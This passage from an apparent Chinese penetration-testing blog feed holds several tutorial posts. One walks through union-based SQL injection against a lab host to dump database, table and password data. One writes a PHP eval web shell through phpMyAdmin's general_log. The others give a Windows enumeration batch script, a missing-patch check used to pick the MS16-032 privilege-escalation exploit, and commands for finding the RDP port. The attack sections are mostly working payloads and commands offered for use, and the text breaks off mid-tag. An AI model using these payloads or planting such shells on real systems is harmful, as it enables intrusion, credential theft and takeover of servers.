        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1374304901&auto=1&height=66"></iframe><h2 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h2><ul><li>SQL注入流程：</li><li>1、判断是否有注入（判断是否为严格校验）</li><li>2、什么类型的SQL注入</li><li>3、语句是否能够被恶意修改</li><li>4、是否能够成功被带入执行</li><li>5、获取我们想要的数据</li></ul><blockquote><p>获取数据库 -&gt; 获取表 -&gt; 获取字段 -&gt; 获取字段内容</p></blockquote><h2 id="判断是否有注入"><a href="#判断是否有注入" class="headerlink" title="判断是否有注入"></a>判断是否有注入</h2><p>注入点 : <code>http://43.247.91.228:84/Less-2/?id=1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">常见的有：</span><br><span class="line">第一种：and</span><br><span class="line">and 1=1  返回正常</span><br><span class="line">and 1=2  返回错误</span><br><span class="line">  </span><br><span class="line">    第二种：.0 、 .1</span><br><span class="line">    ?id=3.0   返回正常</span><br><span class="line">    ?id=3.1  返回错误</span><br><span class="line">    </span><br><span class="line">    第三种：&#x27; (单引号)</span><br><span class="line">    ?id=3&#x27;  加单引号报错</span><br><span class="line">    </span><br><span class="line">    第四种：-1</span><br><span class="line">    ?id=3-1   会返回 ?id=2 这个页面</span><br></pre></td></tr></table></figure><p>正常页面：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/546.png" alt="图片"></p><p><code>and 1=1</code>    返回正常：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/547.png" alt="图片"></p><p><code>and 1=2</code>    返回错误</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/548.png" alt="图片"></p><p><code>’</code>   加单引号返回错误显示</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/549.png" alt="图片"></p><p>判断后，存在<code>SQL</code>注入！</p><h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><p>在 <code>MySQL</code> 中，有一个很重要的数据库：<code>information_schema</code>，而它有三个很重要的表</p><p>第一个表个是：<code>SCHEMATA</code> ：<br><code>information_schema</code> ， 而这个数据库中的 <code>SCHEMATA</code> 表中的 <code>SCHEMA_NAME</code> 列中的值有我们的所有的数据库名</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/550.png" alt="图片"></p><p><code>information_schema</code>：<br>第二个表是：<code>TABLES</code>        <code>TABLES</code> 这个表里的包含了数据库中所有的字段</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/551.png" alt="图片"></p><p><code>information_schema</code>：<br>第三个表是：<code>COLUMNS</code>        <code>COUMNS</code> 这个表里的包含了数据库中所有的表</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/552.png" alt="图片"></p><h3 id="查询想要的数据"><a href="#查询想要的数据" class="headerlink" title="查询想要的数据"></a>查询想要的数据</h3><p>使用 <code>union</code> 查询是否有 <code>4</code> 列 ， <code>%23</code> 是 <code>#</code> 号的 URL 编码，是<code>注释</code>的意思（列数一样就不报错，列数不一样就报错）<br><code>http://43.247.91.228:84/Less-2/?id=2 union select 1,2,3,4 %23</code></p><p>这边是报错了，显示：The used SELECT statements have a different number of columns （查询的内容前后的列数不一致）说明不是 4 列</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/553.png" alt="图片"></p><p>使用 <code>union</code> 查询是否有 <code>3</code> 列 ， <code>%23</code> 是 <code>#</code> 号的 URL 编码，是注释的意思（因为刚刚判断是否有4列出错了，那么就往前减少一位数字判断）<br><code>http://43.247.91.228:84/Less-2/?id=2 union select 1,2,3 %23</code></p><p>这边是显示正常，说明是 <code>3</code> 列</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/554.png" alt="图片"></p><p>这里有个疑问，这个 1,2,3 是什么意思呢？<br>1,2,3，是一个<code>占位</code>的意思。它的意思就是判断前面的列数有几列，一个逗号分隔的就是一列<br>写其他的也可以，例如：66,777,8888</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/555.png" alt="图片"></p><p>这个时候就可以在 1,2,3 <code>占位符</code>里使用 SQL 语句来查询了！<br>因为有 <code>union</code> 查询，是查询前面和后面联合起来查询的，假如直接在列里插入 <code>user（）</code> //查询当前数据库用户名，不会显示</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/556.png" alt="图片"></p><p>这是为什么呢？<br>因为 左边的 <code>http://43.247.91.228:84/Less-2/?id=2</code> 是一条查询语句<br>右边的 <code>select 1,user(),3 %23</code> 没有任何条件也可以查询出来<br>合并起来就是两条数据，但是呢它在显示数据的时候，默认只显示它的第一个数据，就是左边的数据，右边的数据有也不显示<br>这个时候我们就可以让左边的数据没有，就可以显示出了：</p><p><code>-2</code> 是没有的，然后就可以构造语句 ：    <code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,user(),3 %23</code><br>这个时候就查询出当前数据库用户名是 <code>root</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/557.png" alt="图片"></p><p>查询 <code>information_schema</code> 数据库中的 <code>schemata</code> 表里的 <code>schema_name</code> 字段<br><code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,schema_name,3 from information_schema.schemata %23</code></p><p>详解：<br>    information_schema.schemata        查询 information_schema 数据库下的 schemata 表<br>    schema_name                        这个就是 schemata 表里的字段<br>下面是数据库的结构：    </p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/558.png" alt="图片"></p><p>这边只查询出一条数据，查询出来后会显示第一个的字段内容：<code>information_schema</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/559.png" alt="图片"></p><p>想要查询所有的呢，就可以使用一个函数：<code>group_concat()</code>    吧所有的列的数据都显示，以逗号分隔</p><p><code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,group_concat(schema_name),3 from information_schema.schemata %23</code></p><p>详解：<br>    group_concat(schema_name)        这个是用 group_concat 函数查询 schema_name 字段中的所有数据，并以逗号显示出来</p><p>这样就查询出了所有的数据库 ：    information_schema,challenges,hacker,mysql,security,sql,test</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/560.png" alt="图片"></p><h3 id="查询当前所使用的数据库名"><a href="#查询当前所使用的数据库名" class="headerlink" title="查询当前所使用的数据库名"></a>查询当前所使用的数据库名</h3><p>使用 <code>database()</code> 查询当前数据库名：</p><p><code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,database(),3 from information_schema.schemata %23</code><br><code>database()</code> 是SQL语句中查询当前数据库名的函数<br>这边查询出来，当前所使用的数据库名是：<code>security</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/561.png" alt="图片"></p><p>知道了当前所使用的数据库是 <code>security</code> 后，我们需要查询数据库下有那些表：（所有的）<br><code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,group_concat(table_name),3 from information_schema.tables %23</code></p><p>详解：<br>    information_schema.tables        查询 information_schema 数据库下的 tables 的内容<br>    group_concat(table_name)        使用 group_concat() 函数来显示出 table_name 列中的所有字段内容</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/562.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/563.png" alt="图片"></p><p>上面的列出了所有的表了，但是我们想获取当前数据库下的表：<br><code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database() %23</code></p><p>详解：<br>    information_schema.tables 查询 information_schema 数据库下的 tables 表<br>    where table_schema = database() 使用 where 来指出只查询 table_schema 字段里当前所使用的数据库里的表（这个是一个条件语句）<br>    database()    是一个函数，查看当前数据库名</p><p>现在我们知道了，当前所使用的数据库中有四张表：mails,referers,uagents,users<br>一般 <code>users</code> 里会保存账号密码</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/564.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/565.png" alt="图片"></p><p>查询 <code>users</code> 表里的字段：<br><code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name=&#39;users&#39; #</code></p><p>详解：<br>    information_schema.columns            查询 information_schema 数据库下的 columns 表<br>    where table_schema = database()        使用 where 来指出只查询 table_schema 字段里当前所使用的数据库里的表（这个是一个条件语句）<br>    and table_name=’users’                and 条件语句来指出查询 table_name 表里的 ‘users’ 字段</p><p>这里就查询出了 <code>users</code> 表下的字段：id,username,password</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/566.png" alt="图片"></p><p>查询 username，password 字段内容：<br><code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,username,password from security.users #</code></p><p>详解：<br>    在占位符中填写刚刚查询出来的字段名：username，password<br>    from security.users        查询 security 数据库中的 users 表</p><p>查询出来了，他们两个的值是 <code>Dumb</code>（这边只是默认的第一行）</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/567.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/568.png" alt="图片"></p><p>查询所有的字段内容：<br><code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,group_concat(username),group_concat(password) from security.users #</code></p><p>详解：<br>    还是使用 <code>group_concat()</code> 这个函数来实现的！</p><p>但是现实出来的不是那么的美观，而且你也不知道那个用户名对应的是那个密码    </p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/569.png" alt="图片"></p><p>使用函数来实现让它们一一对应现实出账号密码：</p><p><code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,concat(&#39;:&#39;,username,password),3 from security.users #</code></p><p>详解：<br>    concat(‘:’,username,password)        使用<code>concat()</code>函数来对 username，password 来一一对应<br>    而 <code>&#39;:&#39;</code> 是为了让账号和密码用 : 来分隔</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/570.png" alt="图片"></p><p>查询所有的列：<br>    <a href="http://43.247.91.228:84/Less-2/?id=-2">http://43.247.91.228:84/Less-2/?id=-2</a> union select 1,group_concat(concat(‘:’,username,password)),3 from security.users #</p><p>详解：<br>    group_concat(concat(‘:’,username,password))<br>    还是使用 concat(‘:’,username,password) 来对 username，password 来一一对应，并使用 ： 来进行分隔<br>    而 group_concat() 函数是用来现实全部的    </p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/571.png" alt="图片"></p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows提权之主机信息搜集</title>
      <link href="/2019/10/31/RedTeaming-4/"/>
      <url>/2019/10/31/RedTeaming-4/</url>
      
        <content type="html"><![CDATA[<h2 id="提权前言"><a href="#提权前言" class="headerlink" title="提权前言"></a>提权前言</h2><h3 id="对目标服务器信息搜集"><a href="#对目标服务器信息搜集" class="headerlink" title="对目标服务器信息搜集"></a>对目标服务器信息搜集</h3><ul><li>systeminfo</li></ul><p>获取操作系统类型、版本等等信息</p><ul><li>ipconfig /all</li></ul><p>获取IP地址，DNS，计算机名称等详细信息</p><ul><li>net user</li></ul><p>当前用户信息</p><ul><li>whoami</li></ul><p>当前用户权限</p><ul><li>netstat -an</li></ul><p>当前端口开放情况</p><p>这边写了一个POC:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">echo #########Systeminfo ALL（主机用户详细信息）</span><br><span class="line">systeminfo</span><br><span class="line">ver</span><br><span class="line">hostname</span><br><span class="line">net user</span><br><span class="line">net localgroup</span><br><span class="line">net localgroup administrators</span><br><span class="line">net user guest</span><br><span class="line">net user administrator</span><br><span class="line">echo #######at-with-atq#####</span><br><span class="line">echo schtask /query</span><br><span class="line">echo</span><br><span class="line">echo ####tasklist(查看当前进程详细信息)############</span><br><span class="line">tasklist /svc</span><br><span class="line">echo</span><br><span class="line">echo ####Net-work infomation（主机端口等等信息）</span><br><span class="line">ipconfig /all</span><br><span class="line">route print</span><br><span class="line">arp -a</span><br><span class="line">netstat -an</span><br><span class="line">ipconfig /displaydns</span><br><span class="line">echo</span><br><span class="line">echo #######service(服务器)############</span><br><span class="line">sc query type= service state= all</span><br><span class="line">echo #######file(文件信息)##############</span><br><span class="line">cd \</span><br><span class="line">tree -F</span><br></pre></td></tr></table></figure><p>运行示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将运行的结果重定向到当前路径下的info.txt</span><br><span class="line">hack.bat &gt; info.txt</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/544.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/545.png" alt="图片"></p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 后渗透 </tag>
            
            <tag> RedTeam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpMyAdmin利用日志文件GetSHELL</title>
      <link href="/2019/10/30/phpMyAdmin-1/"/>
      <url>/2019/10/30/phpMyAdmin-1/</url>
      
        <content type="html"><![CDATA[<h2 id="hpMyAdmin简介"><a href="#hpMyAdmin简介" class="headerlink" title="hpMyAdmin简介"></a>hpMyAdmin简介</h2><p><code>phpMyAdmin</code> 是众多MySQL图形化管理工具中使用最为广泛的一种，是一款使用<code>PHP </code>开发的基于<code>B/S</code>模式的MySQL客户端软件，该工具是基于 Web 跨平台的管理程序，并且支持简体中文，用户可以在官网上下载最新版本的。</p><h2 id="GetSHELL前提"><a href="#GetSHELL前提" class="headerlink" title="GetSHELL前提"></a>GetSHELL前提</h2><p>1、phpMyAdmin利用日志文件GetSHELL前提账号必须有可读可写权限</p><p>2、MySQL版本大于5.0，MySQL 5.0版本以上会创建日志文件，我们通过修改日志文件的全局变量，就可以GetSHELL</p><p>3、满足上方两个条件，还需要知道网站的绝对路径,对于网站的绝对路径查找有很多方法，在我博客里有讲解到：<a href="http://www.liuwx.cn/penetrationtest-6.html">http://www.liuwx.cn/penetrationtest-6.html</a></p><h2 id="GetSHELL过程"><a href="#GetSHELL过程" class="headerlink" title="GetSHELL过程"></a>GetSHELL过程</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/532.png" alt="图片"></p><p>这边是通过<code>php探针</code>获取到了网站的<code>绝对路径</code>:<code>:/phpStudy/WWW</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/533.png" alt="图片"></p><p>接着是通过弱口令爆破来得到了<code>phpMyAdmin</code>的登陆账号密码:<code>root</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/534.png" alt="图片"></p><p>进入到<code>phpMyAdmin</code>管理页面后，得到一些关键信息：</p><ul><li>数据库服务器</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">服务器: localhost via TCP/IP</span><br><span class="line">软件: MySQL</span><br><span class="line">软件版本: 5.5.40 - MySQL Community Server (GPL)</span><br><span class="line">协议版本: 10</span><br><span class="line">用户: root@localhost</span><br><span class="line">服务器字符集: UTF-8 Unicode (utf8)</span><br></pre></td></tr></table></figure><ul><li>网站服务器</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Apache/2.4.10 (Win32) OpenSSL/0.9.8zb PHP/5.2.17</span><br><span class="line">数据库客户端版本: libmysql - 5.0.51a</span><br><span class="line">PHP 扩展: mysqli 文档</span><br></pre></td></tr></table></figure><p>得知<code>MySQL</code>的版本是大于<code>5.0</code>，那么应该可以通过日志写入shell</p><h2 id="查看日志的信息"><a href="#查看日志的信息" class="headerlink" title="查看日志的信息"></a>查看日志的信息</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/535.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables  like  &#x27;%general%&#x27;;</span><br></pre></td></tr></table></figure><p>日志读写默认是关闭的<code>OFF</code>,然后我们打开日志读写功能：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/536.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">打开general_log日志读写功能</span><br><span class="line">SET GLOBAL general_log=&#x27;on&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/537.png" alt="图片"><br><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/538.png" alt="图片"></p><h2 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h2><p>由于之前我们通过php探针得到了网站的绝对路径，然后我们就可以写入<code>shell.php</code>到网站的根目录下：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/539.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL general_log_file=&#x27;C:/phpStudy/WWW/shell.php&#x27;</span><br></pre></td></tr></table></figure><p>这个时候，对应的路径下就会生成一个<code>shell.php</code>脚本文件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/540.png" alt="图片"></p><h2 id="写入一句话到shell-php"><a href="#写入一句话到shell-php" class="headerlink" title="写入一句话到shell.php"></a>写入一句话到shell.php</h2><p>PHP一句话木马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;liuwx&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>写入一句话语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php @eval($_POST[&#x27;liuwx&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/541.png" alt="图片"></p><p>这个时候就成功写入一句话到了<code>shell.php</code>里：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/542.png" alt="图片"></p><p>成功<code>GetSHELL</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/543.png" alt="图片"></p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> phpMyAdmin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows提权之快速查找Exploit</title>
      <link href="/2019/10/30/RedTeaming-3/"/>
      <url>/2019/10/30/RedTeaming-3/</url>
      
        <content type="html"><![CDATA[<h2 id="提权前言"><a href="#提权前言" class="headerlink" title="提权前言"></a>提权前言</h2><p>拿到一个<code>WebSHELL</code>后，需要看对方服务器打了那些补丁，根据没打的补丁来选择对应的<code>Exploit</code>来进行提权</p><ul><li>POC</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo&gt;liuwx.txt&amp;(for %i in ( KB4013389 KB3199135 KB3186973 KB3178466 KB3164038 KB3143145 KB3143141 KB3136041 K3134228 KB3089656 KB3067505 KB3077657 KB3057839 KB3057191 KB3031432 KB3036220 KB3023266 KB2989935 KB3011780 KB3000061 KB2992611 KB2975684 KB2914368 KB2850851 KB2840221 KB2778930 KB2972621 KB2671387 KB2592799 KB2566454 KB2503665 KB2393802 KB2305420 KB2267960 KB982799 KB2160329 KB977165 KB971468 KB975517 KB970483 KB959454 KB957097 KB958644 KB956803 KB941693 KB921883 KB899588 KB823980 ) do @type liuwx.txt|@find /i &quot;%i&quot;|| @echo %i is Yes)&amp;del /f /q /a liuwx.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">KB4013389 is Yes</span><br><span class="line">KB3199135 is Yes</span><br><span class="line">KB3186973 is Yes</span><br><span class="line">KB3178466 is Yes</span><br><span class="line">KB3164038 is Yes</span><br><span class="line">KB3143145 is Yes</span><br><span class="line">KB3143141 is Yes</span><br><span class="line">KB3136041 is Yes</span><br><span class="line">K3134228 is Yes</span><br><span class="line">KB3089656 is Yes</span><br><span class="line">KB3067505 is Yes</span><br><span class="line">KB3077657 is Yes</span><br><span class="line">KB3057839 is Yes</span><br><span class="line">KB3057191 is Yes</span><br><span class="line">KB3031432 is Yes</span><br><span class="line">KB3036220 is Yes</span><br><span class="line">KB3023266 is Yes</span><br><span class="line">KB2989935 is Yes</span><br><span class="line">KB3011780 is Yes</span><br><span class="line">KB3000061 is Yes</span><br><span class="line">KB2992611 is Yes</span><br><span class="line">KB2975684 is Yes</span><br><span class="line">KB2914368 is Yes</span><br><span class="line">KB2850851 is Yes</span><br><span class="line">KB2840221 is Yes</span><br><span class="line">KB2778930 is Yes</span><br><span class="line">KB2972621 is Yes</span><br><span class="line">KB2671387 is Yes</span><br><span class="line">KB2592799 is Yes</span><br><span class="line">KB2566454 is Yes</span><br><span class="line">KB2503665 is Yes</span><br><span class="line">KB2393802 is Yes</span><br><span class="line">KB2305420 is Yes</span><br><span class="line">KB2267960 is Yes</span><br><span class="line">KB982799 is Yes</span><br><span class="line">KB2160329 is Yes</span><br><span class="line">KB977165 is Yes</span><br><span class="line">KB971468 is Yes</span><br><span class="line">KB975517 is Yes</span><br><span class="line">KB970483 is Yes</span><br><span class="line">KB959454 is Yes</span><br><span class="line">KB957097 is Yes</span><br><span class="line">KB958644 is Yes</span><br><span class="line">KB956803 is Yes</span><br><span class="line">KB941693 is Yes</span><br><span class="line">KB921883 is Yes</span><br><span class="line">KB899588 is Yes</span><br><span class="line">KB823980 is Yes                                                           </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/530.png" alt="图片"></p><p>从上图得知，有很多补丁没有打，那么就可以根据这些补丁号来选择相应的<code>Exp</code></p><h2 id="MS16-032提权"><a href="#MS16-032提权" class="headerlink" title="MS16-032提权"></a>MS16-032提权</h2><p>这里是<code>Windows Server 2008</code>，然后刚好<code>KB3143141</code>这个补丁没打，那么我就用<code>MS16-032</code>来进行提权:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/531.png" alt="图片"></p><p>运行了<code>ms16-032</code>的<code>exe</code>，直接弹出了一个<code>DOS</code>窗口，是系统管理员权限！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 后渗透 </tag>
            
            <tag> RedTeam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DOS查找Windows远程桌面的端口</title>
      <link href="/2019/10/30/RedTeaming-2/"/>
      <url>/2019/10/30/RedTeaming-2/</url>
      
        <content type="html"><![CDATA[<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>查看是否开启了远程桌面服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start | findstr &quot;Terminal Services&quot;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/529.png" alt="图片"></p><p>如果Windows打开了远程桌面，可以先查看远程桌面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc | findstr &quot;TermService&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svchost.exe    2140 TermService</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/525.png" alt="图片"></p><p><code>TermService</code>是远程桌面的服务名称，<code>2140</code>是它的进程<code>PID</code></p><p>我们可以查找<code>PID</code>就可以找到<code>远程桌面</code>的端口了：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/526.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;netstat -ano | findstr &quot;2140&quot;</span><br><span class="line">  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       2140</span><br><span class="line">  TCP    [::]:3389              [::]:0                 LISTENING       2140</span><br></pre></td></tr></table></figure><p>端口是<code>3389</code>!</p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><ul><li>注册表里查找</li></ul><p><code>regedit</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/527.png" alt="图片"></p><p>或者直接使用cmd查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber</span><br></pre></td></tr></table></figure><p><img 